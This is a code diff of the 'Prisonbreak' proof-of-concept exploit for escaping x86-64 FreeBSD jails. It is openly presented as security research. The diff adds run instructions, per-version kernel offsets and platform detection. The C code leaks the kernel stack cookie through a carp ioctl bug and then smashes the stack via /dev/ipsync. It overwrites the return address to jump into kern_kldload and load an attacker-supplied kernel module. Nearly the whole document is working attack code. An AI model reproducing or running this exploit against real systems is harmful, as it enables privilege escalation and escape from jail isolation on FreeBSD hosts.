@@ -1,99 +1,12 @@
-#include <arpa/inet.h>
-#include <err.h>
-#include <errno.h>
-#include <fcntl.h>
-#include <inttypes.h>
-#include <net/if.h>
-#include <netinet/ip_carp.h>
-#include <pthread.h>
-#include <stdio.h>
-#include <stdlib.h>
-#include <string.h>
-#include <sys/ioctl.h>
-#include <sys/mman.h>
-#include <sys/socket.h>
-#include <sys/sysctl.h>
-#include <sys/types.h>
-#include <sys/user.h>
-#include <unistd.h>
-
-#define u_32_t unsigned int
-
-#define NUM_CARP_IFS 12
-#define IF_NAME "epair100b"
-
-#define DEBUG_RESTORED_RBP_ADDRESS 0xfffffe0070e09cc0
-#define PRODUCTION_RESTORED_RBP_ADDRESS 0xfffffe0070e09cc0 - 1000
-
-#define DEBUG_KERN_KLDLOAD_ADDRESS 0xffffffff80af7af0
-#define PRODUCTION_KERN_KLDLOAD_ADDRESS 0xffffffff80b3db70
-
-typedef struct synchdr {
-  u_32_t sm_magic; /* magic */
-  u_char sm_v;     /* version: 4,6 */
-  u_char sm_p;     /* protocol */
-  u_char sm_cmd;   /* command */
-  u_char sm_table; /* NAT, STATE, etc */
-  u_int sm_num;    /* table entry number */
-  int sm_rev;      /* forward/reverse */
-  int sm_len;      /* length of the data section */
-  void* sm_sl;     /* back pointer to parent */
-} synchdr_t;
-
-struct print_msg {
-  unsigned int entry_ready;
-  unsigned int len;
-  char msg[0];
-};
-
-enum {
-    FBSD_15_RELEASE = 0,
-    FBSD_14_DEBUG   = 1,
-    UNKNOWN = 2
-};
-
-struct kernel_offsets {
-    unsigned int stack_cookie_offset;
-    unsigned int td_offset;
-    unsigned int kernel_module_path_offset;
-    unsigned int fileid_offset;
-    unsigned int base_pointer_offset;
-    unsigned int instruction_pointer_offset;
-    uint64_t restored_ebp_address;
-    uint64_t kern_kldload_address;
-};
-
 /*
- * [0] FreeBSD 15.0-RELEASE
- * [1] FreeBSD 14.3-DEBUG
- */
-static const struct kernel_offsets koffsets[] = {
-    /* FreeBSD 15.0-RELEASE */
-    {
-        .stack_cookie_offset         = 2832,
-        .td_offset                   = 2848,  /* 2872 - 24 */
-        .kernel_module_path_offset   = 2872,  /* 2864 + 8 */
-        .fileid_offset               = 2863,  /* 2840 + 23 */
-        .base_pointer_offset         = 2880,
-        .instruction_pointer_offset  = 2888,
-        .restored_ebp_address        = 0xfffffe0070e098d8, /* 0xfffffe0070e09cc0 - 1000 */
-        .kern_kldload_address        = 0xffffffff80b3db70,
-    },
+Prisonbreak
+-----------
+Proof of concept jail escape exploit for x86-64 FreeBSD by Ilja van Sprundel and Michael Smith.
 
-    /* FreeBSD 14.3-DEBUG */
-    {
-        .stack_cookie_offset         = 2832,
-        .td_offset                   = 2872,
-        .kernel_module_path_offset   = 2864,
-        .fileid_offset               = 2840,
-        .base_pointer_offset         = 2880,
-        .instruction_pointer_offset  = 2888,
-        .restored_ebp_address        = 0xfffffe0070e09cc0,
-        .kern_kldload_address        = 0xffffffff80af7af0,
-    }
-};
+https://github.com/iljavs/FreeBSD-Jail-Security-Research
 
-/*
+TODO: Moar disclaimer / license info?
+
 Prerequisites
 -------------
 1. Host must have carp kernel module loaded
@@ -116,9 +29,109 @@ EOF
 
 service devfs restart
 service jail restart prisonbreak
+
+How to run
+----------
+1. Copy the poc/prisonbreak-1 directory over to a supported FreeBSD jail with root access
+2. Build the prisonbreak kernel module: cd module && make && cp prisonbreak.ko ../ && cd ..
+3. Build the prisobreak exploit: make
+4. Run the prisonbreak exploit shell script: ./exploit.sh
+5. Profit (of all the knowledge you have gained, not financially)
 */
 
-void cyclic(char* buf, size_t len) {
+#include <arpa/inet.h>
+#include <err.h>
+#include <errno.h>
+#include <fcntl.h>
+#include <inttypes.h>
+#include <net/if.h>
+#include <netinet/ip_carp.h>
+#include <pthread.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/ioctl.h>
+#include <sys/mman.h>
+#include <sys/socket.h>
+#include <sys/sysctl.h>
+#include <sys/types.h>
+#include <sys/user.h>
+#include <unistd.h>
+#include <sys/utsname.h>
+
+#define u_32_t unsigned int
+
+// get_stack_cookie() configuration
+#define NUM_CARP_IFS 12
+#define IF_NAME "epair100b"
+
+// prisonbreak() configuration
+#define USER_MAPPED_MEMORY_ADDRESS 0x0000414141410000ULL
+
+typedef struct synchdr {
+  u_32_t sm_magic; /* magic */
+  u_char sm_v;     /* version: 4,6 */
+  u_char sm_p;     /* protocol */
+  u_char sm_cmd;   /* command */
+  u_char sm_table; /* NAT, STATE, etc */
+  u_int sm_num;    /* table entry number */
+  int sm_rev;      /* forward/reverse */
+  int sm_len;      /* length of the data section */
+  void* sm_sl;     /* back pointer to parent */
+} synchdr_t;
+
+struct print_msg {
+  unsigned int entry_ready;
+  unsigned int len;
+  char msg[0];
+};
+
+enum { FBSD_15_GENERIC = 0, FBSD_14_DEBUG = 1, PLATFORM_UNKNOWN = 2 };
+
+struct kernel_offsets {
+  unsigned int ipsync_buffer_overlow_size;
+  unsigned int stack_cookie_offset;
+  unsigned int td_offset;
+  unsigned int kernel_module_path_offset;
+  unsigned int fileid_offset;
+  unsigned int base_pointer_offset;
+  unsigned int instruction_pointer_offset;
+  uint64_t restored_ebp_address;
+  uint64_t kern_kldload_address;
+};
+
+/*
+ * [0] FreeBSD 15.0-RELEASE GENERIC
+ * [1] FreeBSD 14.3-RELEASE GENERIC-DEBUG
+ */
+static const struct kernel_offsets koffsets[] = {
+    /* FreeBSD 15.0-RELEASE GENERIC */
+    {
+        .ipsync_buffer_overlow_size = 2896,
+        .stack_cookie_offset = 2832,
+        .td_offset = 2848,                 /* 2872 - 24 */
+        .kernel_module_path_offset = 2872, /* 2864 + 8 */
+        .fileid_offset = 2863,             /* 2840 + 23 */
+        .base_pointer_offset = 2880,
+        .instruction_pointer_offset = 2888,
+        .restored_ebp_address = 0xfffffe0070e098d8, /* 0xfffffe0070e09cc0 - 1000 */
+        .kern_kldload_address = 0xffffffff80b3db70,
+    },
+
+    /* FreeBSD 14.3-RELEASE GENERIC-DEBUG */
+    {
+        .ipsync_buffer_overlow_size = 2896,
+        .stack_cookie_offset = 2832,
+        .td_offset = 2872,
+        .kernel_module_path_offset = 2864,
+        .fileid_offset = 2840,
+        .base_pointer_offset = 2880,
+        .instruction_pointer_offset = 2888,
+        .restored_ebp_address = 0xfffffe0070e09cc0,
+        .kern_kldload_address = 0xffffffff80af7af0,
+    }};
+
+void cyclic_pattern(char* buf, size_t len) {
   const char set1[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
   const char set2[] = "abcdefghijklmnopqrstuvwxyz";
   const char set3[] = "0123456789";
@@ -188,25 +201,51 @@ unsigned long get_pargs() {
   return (unsigned long)kp.ki_args + 50;
 }
 
-/* XXX TODO, need to do a proper implementation based on uname() values */
 unsigned int get_platform_idx() {
-  return FBSD_14_DEBUG;
+  // Get kernel config name (e.g. GENERIC, GENERIC-DEBUG, ...)
+  char kern_ident[256];
+  size_t kern_ident_len = sizeof(kern_ident);
+
+  if (sysctlbyname("kern.ident", kern_ident, &kern_ident_len, NULL, 0) == -1) {
+    return PLATFORM_UNKNOWN;
+  }
+
+  // Get release (e.g. 14.3-RELEASE, 15.0-RELEASE, ...) via POSIX uname(2)
+  struct utsname u;
+  if (uname(&u) == -1) {
+    return PLATFORM_UNKNOWN;
+  }
+
+  /* FreeBSD 14.3 GENERIC-DEBUG */
+  if (strcmp(u.release, "14.3-RELEASE") == 0) {
+    if (strcmp(kern_ident, "GENERIC-DEBUG") == 0) return FBSD_14_DEBUG;
+
+    return PLATFORM_UNKNOWN;
+  }
+
+  /* FreeBSD 15.0 GENERIC */
+  if (strcmp(u.release, "15.0-RELEASE") == 0) {
+    if (strcmp(kern_ident, "GENERIC") == 0) return FBSD_15_GENERIC;
+
+    return PLATFORM_UNKNOWN;
+  }
+
+  return PLATFORM_UNKNOWN;
 }
 
-void write_uint64(char *ptr, unsigned int offset, uint64_t value) {
-  char *dest = ptr + offset;
-  uint64_t *u64dest = (uint64_t *)dest;
+void write_uint64(char* ptr, unsigned int offset, uint64_t value) {
+  char* dest = ptr + offset;
+  uint64_t* u64dest = (uint64_t*)dest;
   *u64dest = value;
 }
 
+/*
+ *
+ * 1. Get the stack cookie through a kernel memory leak bug
+ *
+ * See https://github.com/iljavs/FreeBSD-Jail-Security-Research/issues/50
+ */
 uint64_t get_stack_cookie() {
-  /*
-   *
-   * 1. Get the stack cookie through a kernel memory leak bug
-   *
-   * See https://github.com/iljavs/FreeBSD-Jail-Security-Research/issues/50
-   */
-
   int sock;
   struct carpreq carpr_set;
   struct carpreq carpr_get[NUM_CARP_IFS];
@@ -240,8 +279,7 @@ uint64_t get_stack_cookie() {
   //
   // NOTE(m): Defining multiple carp interfaces on one physical interface does
   // not seem possible using `ifconfig(8)`, either by design or because of a
-  // subtle locking bug (see
-  // https://github.com/iljavs/FreeBSD-Jail-Security-Research/issues/51)
+  // subtle locking bug (see https://github.com/iljavs/FreeBSD-Jail-Security-Research/issues/51)
   for (int i = 1; i < NUM_CARP_IFS + 1; i++) {
     carpr_set.carpr_vhid = i;
     if (ioctl(sock, SIOCSVH, (caddr_t)&ifr_set) == -1) {
@@ -264,19 +302,18 @@ uint64_t get_stack_cookie() {
   memcpy(&stack_cookie, base + offset_stack_cookie, sizeof(stack_cookie));
   printf("STACK COOKIE: 0x%016" PRIx64 "\n", stack_cookie);
 
-  close(sock);  
+  close(sock);
   return stack_cookie;
 }
 
+/*
+ *
+ * 2. Use the retrieved stack cookie in a classic stack smash attack
+ *
+ * https://github.com/iljavs/FreeBSD-Jail-Security-Research/issues/13
+ */
 void* prisonbreak(void* arg) {
   uint64_t stack_cookie = get_stack_cookie();
-
-  /*
-   *
-   * 2. Use the retrieved stack cookie in a stack smash attack
-   *
-   * https://github.com/iljavs/FreeBSD-Jail-Security-Research/issues/13
-   */
 
   int fd = open("/dev/ipsync", O_RDWR);
 
@@ -285,8 +322,8 @@ void* prisonbreak(void* arg) {
     exit(0);
   }
   unsigned int idx = get_platform_idx();
-  if (idx == UNKNOWN) {
-    printf("platform not supported for this exploit\n");
+  if (idx == PLATFORM_UNKNOWN) {
+    printf("Unsupported FreeBSD version and kernel configuration for this exploit\n");
     exit(0);
   }
   struct kernel_offsets ko = koffsets[idx];
@@ -297,62 +334,36 @@ void* prisonbreak(void* arg) {
   // for other locals, padding, the stack cookie, saved registers, the caller's
   // frame pointer and finally the saved return address.
   // In other words, we need to dig a long enough tunnel.
-  int len = 2896;
+  int len = ko.ipsync_buffer_overlow_size;
   synchdr_t* header = malloc(len);
 
   // Fill the buffer with some easily recognizable bogus data (ASCII 'A')
   // memset(header, 0x41, len);
-
-  // Fill the buffer with cyclic data to make it easy to calculate offsets
-  cyclic((char*)header, len);
+  // or fill the buffer with cyclic data to make it easy to calculate offsets
+  cyclic_pattern((char*)header, len);
 
   // Restore the stack cookie at the location we know it should go, using the
   // value extracted earlier to please the stack protection checker 2048 + 32 =
   // 2080 (start of our overflow) + 752 bytes = 2832
   // i.e., use the badge we got off that guard.
-//  int stack_cookie_offset = 2832;
-//  unsigned long* ptr = (unsigned long*)((char*)header + stack_cookie_offset);
-//  *ptr = stack_cookie;
   write_uint64((char*)header, ko.stack_cookie_offset, stack_cookie);
 
   // Overwrite the address where kern_kldload is going to read the td argument
-//  int td_offset = 2872;
-  // int td_offset = 2872 - 24;
-//  ptr = (unsigned long*)((char*)header + td_offset);
-//  *ptr = get_td();
   write_uint64((char*)header, ko.td_offset, get_td());
 
   // Overwrite the address where kern_kldload is going to read the string
   // containing our custom kernel module path
-//  int kernel_module_path_offset = 2864;
-  // int kernel_module_path_offset = 2864 + 8;
-//  ptr = (unsigned long*)((char*)header + kernel_module_path_offset);
-//  *ptr = get_pargs();
   write_uint64((char*)header, ko.kernel_module_path_offset, get_pargs());
 
   // Overwrite the address where kern_kldload is going to read the fileid
-//  int fileid_offset = 2840;
-  // int fileid_offset = 2840 + 23;
-//  ptr = (unsigned long*)((char*)header + fileid_offset);
-//  *ptr = 0;
   write_uint64((char*)header, ko.fileid_offset, 0);
-  
+
   // Restore $rbp
-//  int rbp_offset = 2880;
-//  ptr = (unsigned long*)((char*)header + rbp_offset);
-//  *ptr = DEBUG_RESTORED_RBP_ADDRESS;
   write_uint64((char*)header, ko.base_pointer_offset, ko.restored_ebp_address);
 
-  // Overwrite the return address to jump into something we can use, e.g.
-  // `kern_kldload()`. 2048 + 32 = 2080 (start of our overflow) + 808 bytes
-  // = 2888
-//  int return_address_offset = 2888;
-//  ptr = (unsigned long*)((char*)header + return_address_offset);
-//  unsigned long kern_kldload = DEBUG_KERN_KLDLOAD_ADDRESS;
+  // Overwrite the return address to jump into something we can use, e.g. `kern_kldload()`.
   // NOTE: We jump 69 bytes *into* kern_kldload to bypass some checks, i.e.
   // making sure none of the guards spot us.
-//  unsigned long jump_to_address = kern_kldload + 69;
-//  *ptr = jump_to_address;
   write_uint64((char*)header, ko.instruction_pointer_offset, ko.kern_kldload_address + 69);
 
   // Populate the header with expected values so we pass all the checks and get
@@ -384,7 +395,7 @@ int map_memory() {
   size_t pages = 4;
   size_t len = 4096 * pages;
 
-  void* fixed = (void*)(uintptr_t)0x0000414141410000ULL;
+  void* fixed = (void*)(uintptr_t)USER_MAPPED_MEMORY_ADDRESS;
 
   int prot = PROT_READ | PROT_WRITE;
   int flags = MAP_PRIVATE | MAP_ANONYMOUS;
@@ -402,14 +413,14 @@ int map_memory() {
 }
 
 void dispatch_messages() {
-  void* fixed = (void*)(uintptr_t)0x0000414141410000ULL;
+  void* fixed = (void*)(uintptr_t)USER_MAPPED_MEMORY_ADDRESS;
   struct print_msg* msg = fixed;
 
   while (1) {
     while (msg->entry_ready == 0);
 
     if (msg->entry_ready == 2) {
-      printf("Final message received. Exploit done.\n");
+      printf("Final message received. Exploit done. You've probably made it out of prison.\n");
 
       return;
     }
